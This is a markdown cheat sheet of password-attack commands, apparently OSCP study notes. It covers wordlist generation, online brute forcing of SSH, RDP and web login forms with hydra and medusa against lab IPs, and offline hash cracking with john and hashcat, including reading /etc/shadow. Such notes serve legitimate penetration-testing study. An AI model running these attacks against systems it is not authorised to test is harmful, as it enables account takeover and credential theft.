# Password Attacks

## references

<http://gchq.github.io/CyberChef/>
<http://openwall.info/wiki/john/sample-hashes>

## dictionary

```bash
/usr/share/wordlists/
/usr/share/seclist/

cewl www.megacorpone.com -m 6 -w megacorpone-cewl.txt
john --wordlist=megacorpone-cewl.txt --rules --stdout > megacorpone-john.txt

crunch 6 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o crunch.txt
```

## online

### crackstation

<https://crackstation.net/>

### medusa

```bash
medusa -d
medusa -M http -q

medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin -T 10

```

### hydra

```bash
hydra -l george -P ~/OSCP/rockyou.txt -s 2222 ssh://192.168.161.201
hydra -L ./user.txt -p "SuperS3cure1337#" rdp://192.168.161.202

hydra -l admin -P ~/OSCP/rockyou.txt 192.168.161.201 http-get 

hydra -l admin -P ~/OSCP/rockyou.txt 192.168.161.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed"
hydra 10.1.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid Password!" -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 -o hydra-http-post-form.txt
```

## offline

### hashid

```bash
hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
hashid -m hash.txt
hashid -j
```

### john

```bash
unshadow /etc/passwd /etc/shadow > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### hashcat

```bash
hashcat --help | grep -ni ntlm
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --show

hashcat --help | grep -ni \$p 
hashcat -m 400 wp.hash ~/OSCP/rockyou.txt 
```
